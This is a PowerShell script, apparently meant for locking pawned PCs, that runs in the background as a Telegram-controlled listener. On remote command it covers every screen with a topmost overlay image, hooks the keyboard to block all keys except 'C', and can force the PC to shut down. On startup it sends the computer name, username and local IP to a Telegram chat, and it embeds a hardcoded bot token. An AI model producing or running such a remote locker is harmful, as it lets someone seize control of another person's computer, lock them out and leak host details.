# =========================================================
# PawnshopLock v5.0  –  Single‑File Listener + Dynamic Lock
# ---------------------------------------------------------
# ▸ Run once (admin **not** required) ▶ stays in background.
# ▸ Starts **unlocked** → send /lock<USER> from Telegram to lock.
# ▸ /unlock<USER> or press local 'C' unlocks.
# ▸ /shutdown<USER> powers PC off.
# =========================================================

# ---------------------- SETTINGS -------------------------
$imageURL   = 'https://raw.githubusercontent.com/diezul/x/main/1.png'
$botToken   = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
$chatID     = '656189986'
$user       = $env:USERNAME
$pc         = $env:COMPUTERNAME
$lockCmd    = "/lock$user".ToLower()
$unlockCmd  = "/unlock$user".ToLower()
$shutCmd    = "/shutdown$user".ToLower()
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
# ---------------------------------------------------------

# temp image
$tempImage = "$env:TEMP\pawnlock.jpg"
try{ Invoke-WebRequest $imageURL -OutFile $tempImage -UseBasicParsing }catch{}

# quick TG helper
function TG([string]$msg){ try{ @{chat_id=$chatID;text=$msg}|ConvertTo-Json -Compress|Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -ContentType 'application/json' -TimeoutSec 10 }catch{} }

# -------------- KEYBOARD BLOCKER (all but C) -------------
Add-Type @"
using System;using System.Runtime.InteropServices;using System.Windows.Forms;
public class KeyBlocker{static IntPtr h=IntPtr.Zero;delegate IntPtr P(int n,IntPtr w,IntPtr l);static P d=Hook;const int WH=13,WMK=0x100,WMS=0x104;[DllImport("user32.dll")]static extern IntPtr SetWindowsHookEx(int id,P cb,IntPtr m,uint t);[DllImport("user32.dll")]static extern bool UnhookWindowsHookEx(IntPtr h);[DllImport("user32.dll")]static extern IntPtr CallNextHookEx(IntPtr h,int n,IntPtr w,IntPtr l);[DllImport("kernel32.dll")]static extern IntPtr GetModuleHandle(string n);
public static void Block(){ if(h==IntPtr.Zero) h=SetWindowsHookEx(WH,d,GetModuleHandle(null),0);} public static void Unblock(){ if(h!=IntPtr.Zero){UnhookWindowsHookEx(h);h=IntPtr.Zero;} }
static IntPtr Hook(int n,IntPtr w,IntPtr l){ if(n>=0&&(w==(IntPtr)WMK||w==(IntPtr)WMS)){ int vk=Marshal.ReadInt32(l); if(vk==0x43) return CallNextHookEx(h,n,w,l); return (IntPtr)1;} return CallNextHookEx(h,n,w,l);} }
"@

# -------------- OVERLAY WINDOW ---------------------------
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$forms=$null
function Show-Lock{
  if($forms){return}
  [KeyBlocker]::Block()
  $forms=@(); foreach($s in [Windows.Forms.Screen]::AllScreens){
    $f=New-Object Windows.Forms.Form -Property @{FormBorderStyle='None';WindowState='Maximized';StartPosition='Manual';TopMost=$true;Location=$s.Bounds.Location;Size=$s.Bounds.Size;BackColor='Black';KeyPreview=$true}
    $pb=New-Object Windows.Forms.PictureBox -Property @{Image=[Drawing.Image]::FromFile($tempImage);Dock='Fill';SizeMode='StretchImage'}
    $f.Controls.Add($pb)
    $f.Add_Deactivate({ $_.Activate() })
    $f.Add_KeyDown({ if($_.KeyCode -eq 'C'){ Hide-Lock }; $_.Handled=$true })
    $f.Show(); $forms+= $f
  }
  TG "🔒 $pc locked."
}
function Hide-Lock{
  if(!$forms){return}
  foreach($f in $forms){ try{ $f.Close() }catch{} }
  $forms=$null; [KeyBlocker]::Unblock(); TG "🔓 $pc unlocked."
}

# -------------- ONLINE PING ------------------------------
function IPs{ try{(Get-NetIPAddress -AddressFamily IPv4|?{ $_.IPAddress -notmatch '^(127|169\.254|0\.|255)' })[0].IPAddress}catch{'n/a'} }
TG "✅ Listener up on $pc ($user). Cmds: $lockCmd $unlockCmd $shutCmd | IP: $(IPs)"

# -------------- TELEGRAM LOOP ----------------------------
$offset=0
while($true){
  try{
    $u=Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?timeout=25&offset=$offset" -TimeoutSec 30
    foreach($m in $u.result){
      $offset=$m.update_id+1; $txt=$m.message.text.ToLower(); if($m.message.chat.id-ne [int]$chatID){continue}
      if($txt -eq $lockCmd){ Show-Lock }
      elseif($txt -eq $unlockCmd){ Hide-Lock }
      elseif($txt -eq $shutCmd){ TG "⏹ Shutting down $pc"; Stop-Computer -Force }
    }
  }catch{ Start-Sleep 5 }
}
